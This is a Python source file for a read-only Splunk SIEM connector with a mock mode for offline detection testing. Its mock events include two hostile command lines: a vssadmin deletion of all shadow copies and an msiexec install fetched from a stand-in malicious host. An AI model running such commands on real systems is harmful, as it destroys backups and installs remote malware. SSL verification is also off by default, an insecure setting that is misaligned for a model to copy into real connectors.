import time
import httpx
from typing import List, Dict, Any, Optional
from app.base_connector import BaseConnector, ConnectorConfig, ConnectorRegistry

class SplunkConnector(BaseConnector):
    """
    Splunk SIEM Connector implementing read-only SPL query execution,
    polling, and connection verification via Splunk REST API.
    Supports a mock mode for offline testing without a live Splunk instance.
    """

    def __init__(self, config: ConnectorConfig):
        super().__init__(config)
        self.host = self.config.credentials.get("host", "").rstrip("/")
        self.port = self.config.credentials.get("port", 8089)
        self.token = self.config.credentials.get("token")
        self.username = self.config.credentials.get("username")
        self.password = self.config.credentials.get("password")
        self.is_mock = self.config.credentials.get("mock", not bool(self.host))
        self.verify_ssl = self.config.credentials.get("verify_ssl", False)
        
        self.base_url = f"{self.host}:{self.port}" if self.host else ""

    def _get_auth_headers(self) -> Dict[str, str]:
        headers = {}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        return headers

    def _get_auth_tuple(self) -> Optional[tuple]:
        if not self.token and self.username and self.password:
            return (self.username, self.password)
        return None

    def validate_connection(self) -> bool:
        """Verify credentials work. READ-ONLY."""
        if self.is_mock:
            return True

        url = f"{self.base_url}/services/authentication/current-context?output_mode=json"
        try:
            with httpx.Client(verify=self.verify_ssl, timeout=10.0) as client:
                resp = client.get(url, headers=self._get_auth_headers(), auth=self._get_auth_tuple())
                return resp.status_code == 200
        except Exception:
            return False

    def query(self, query_str: str, time_range: tuple = (None, None)) -> List[Dict[str, Any]]:
        """Execute a read-only SPL query. Returns raw results."""
        if self.is_mock:
            return self._query_mock(query_str, time_range)

        earliest_time, latest_time = time_range
        # 1. Dispatch Search Job via REST API
        search_url = f"{self.base_url}/services/search/jobs"
        data = {
            "search": f"search {query_str}" if not query_str.strip().startswith("search") else query_str,
            "output_mode": "json"
        }
        if earliest_time:
            data["earliest_time"] = str(earliest_time)
        if latest_time:
            data["latest_time"] = str(latest_time)

        try:
            with httpx.Client(verify=self.verify_ssl, timeout=30.0) as client:
                resp = client.post(search_url, data=data, headers=self._get_auth_headers(), auth=self._get_auth_tuple())
                if resp.status_code not in (200, 201):
                    return []
                
                job_data = resp.json()
                sid = job_data.get("sid")
                if not sid:
                    return []

                # 2. Poll Search Job status until DONE
                status_url = f"{self.base_url}/services/search/jobs/{sid}?output_mode=json"
                for _ in range(30):
                    status_resp = client.get(status_url, headers=self._get_auth_headers(), auth=self._get_auth_tuple())
                    if status_resp.status_code == 200:
                        entry = status_resp.json().get("entry", [{}])[0]
                        if entry.get("content", {}).get("dispatchState") == "DONE":
                            break
                    time.sleep(1.0)

                # 3. Retrieve Search Results
                results_url = f"{self.base_url}/services/search/jobs/{sid}/results?output_mode=json"
                results_resp = client.get(results_url, headers=self._get_auth_headers(), auth=self._get_auth_tuple())
                if results_resp.status_code == 200:
                    return results_resp.json().get("results", [])
                return []
        except Exception:
            return []

    def poll(self) -> List[Dict[str, Any]]:
        """Pull new events since last poll. READ-ONLY."""
        now = time.time()
        start_ts = self._last_poll_ts or (now - 300)
        results = self.query("index=* | head 100", time_range=(start_ts, now))
        self._last_poll_ts = now
        return results

    def _query_mock(self, query_str: str, time_range: tuple) -> List[Dict[str, Any]]:
        """Mock SPL search execution using fixture telemetry matching."""
        mock_events = [
            {
                "host": "WORKSTATION-01",
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet -encrypt",
                "User": "NT AUTHORITY\\SYSTEM",
                "_time": "2026-07-15T10:00:00Z",
                "index": "windows"
            },
            {
                "host": "WORKSTATION-02",
                "Image": "C:\\Windows\\System32\\msiexec.exe",
                "CommandLine": "msiexec.exe /i http://malicious-repo.com/setup.msi -install",
                "User": "DOMAIN\\user1",
                "_time": "2026-07-15T10:05:00Z",
                "index": "windows"
            }
        ]

        query_lower = query_str.lower()
        results = []
        for event in mock_events:
            cmd_match = False
            img_match = False

            if "-encrypt" in query_lower or "cipher /e" in query_lower:
                if "-encrypt" in event["CommandLine"].lower():
                    cmd_match = True
            elif "msiexec" in query_lower or "/i" in query_lower:
                if "msiexec" in event["Image"].lower() or "/i" in event["CommandLine"].lower():
                    cmd_match = True
            else:
                cmd_match = True

            if "vssadmin.exe" in query_lower:
                if "vssadmin.exe" in event["Image"].lower():
                    img_match = True
            else:
                img_match = True

            if cmd_match and img_match:
                results.append(event)
                
        return results

# Register Splunk Connector with the registry
ConnectorRegistry.register("splunk", SplunkConnector)
